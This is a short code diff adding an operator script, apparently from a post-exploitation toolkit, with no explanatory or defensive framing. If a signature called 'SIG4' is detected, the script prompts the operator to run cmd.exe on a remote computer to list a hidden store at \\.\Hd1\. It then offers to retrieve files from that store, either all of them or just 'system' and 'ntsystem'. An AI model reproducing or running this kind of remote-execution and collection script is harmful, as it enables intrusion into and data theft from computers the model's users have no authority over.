@@ -1,0 +1,13 @@
+if (prompt "SIG4 was detected.  Do you want to dir the covert store? (runs cmd.exe on remote computer)") {
+	`run -command "cmd.exe /c dir \\\\.\\Hd1\\\\ " -redirect`;
+
+
+	if (prompt "SIG4: Based on the output of the dir of \\\\.\\Hd1\\\\ (look in EP log viewer), do you want to get everything in the directory?") {
+		`get * -path \\\\.\\Hd1\\\\`;
+	} else {
+		if (prompt "SIG4: OK, do you want to get just system and ntsystem? (recommended!)") {
+			`get system -path \\\\.\\Hd1\\\\`;
+			`get ntsystem -path \\\\.\\Hd1\\\\`;
+		}
+	}
+}
